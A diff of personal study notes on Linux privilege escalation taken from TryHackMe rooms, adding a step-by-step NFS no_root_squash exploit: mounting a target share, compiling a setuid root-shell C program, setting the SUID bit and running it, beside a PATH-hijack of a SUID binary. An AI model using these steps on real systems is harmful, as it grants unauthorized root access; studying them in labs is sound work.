@@ -320,7 +320,7 @@ except:
 * the text of /home/matt/flag6.txt is printed on the terminal screen
 This happens because when the test executable runs it looks for the thm parameter that is in its script. It checks $PATH and since the /home/murdoch file is now listed there it looks in that folder for thm. It finds the thm file that the hacker created and runs the script it finds in that file. That script concatanetes the /home/matt/flag6.txt file. Now, that file is not normally readable by the user Karen; however, the test executable had the SUID set so it runs with root privileges and therefore can use the script in thm to concatenate the /home/matt/flag6.txt file
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-[From: https://tryhackme.com/room/linprivesc ; Task 11 - Privilege Escalation: NFS (with editing, etc.)]
+[From: https://tryhackme.com/room/linprivesc ; Task 11 - Privilege Escalation: NFS (with editing, etc.) and https://medium.com/@cyberjunkiebynight/linux-privesc-tryhackme-write-up-a284b97d5f4 (with editing, etc.)]
 Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.
 
 Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.
@@ -329,13 +329,35 @@ NFS (Network File Sharing) configuration is kept in the /etc/exports file. This 
 The critical element for this privilege escalation vector is the “no_root_squash” option that may appear next to certain shares. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges (i.e. squash the root). However, if the “no_root_squash” option is present on a writable share, we CAN create an executable with the SUID bit set and run it on the target system.
 
 To elevate privileges, we start by enumerating mountable shares from our attacking machine:
-> showmount -e <IP_ADDRESS_OF_MACHINE WE_ARE_ATTACKING>
+> showmount -e <TARGET_IP>
 We check which shares have “no_root_squash”:
 > cat /etc/exports
-If we find a share that is both writable and is “no_root_squash”, we mount it to our attacking machine and start building our executable. For example:
-> mkdir /tmp/attackfile
-> mount -o rw 
+If we find a share that is both writable and is “no_root_squash”, we mount it to our attacking machine and start building our executable, as follows:
+[Note: in the following example we are assuming that /tmp is both writable and has “no_root_squash” set.]
+
+> mkdir /tmp/<FOLDERNAME_WHERE_WE_WILL_PUT_OUR_EXECUTABLE>
+> mount -o rw <TARGET_IP>:/tmp /tmp/<FOLDERNAME_WHERE_WE_WILL_PUT_OUR_EXECUTABLE>
+Run the command 'ls -la' on your device and on the target_IP device; it should show the same files in the /tmp directory on both your device and the target_IP device.
 As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.
+Now create a executable file that will run “/bin/bash” on the target system upon execution:
+> nano <FILENAME>.c
+int main()
+{ setgid(0);
+ setuid(0);
+ system("/bin/bash");
+ return 0;
+}
+Now compile the executable:
+> gcc <FILENAME>.c -o <OUTPUT_FILENAME> -w
+Set SUID bit:
+> chmod +s <OUTPUT_FILENAME>
+The 'ls -la' command should show the executable on the target_IP.
+Run the executable from the target_IP:
+> ./<OUTPUT_FILENAME>
+Check if you have root:
+> id
+or
+> whoami
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 [From: https://tryhackme.com/room/vulnversity ; Task 5 - Privilege Escalation]
 "In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
